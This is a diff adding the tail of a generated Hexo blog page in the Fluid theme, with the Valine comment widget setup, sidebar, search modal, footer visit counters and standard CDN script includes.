+          {"appId":"A72cL0RlIkmsXlCGMx51Qi51-gzGzoHsz","appKey":"xxsSPn2ge0tYPU7nwv5Gyd1r","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
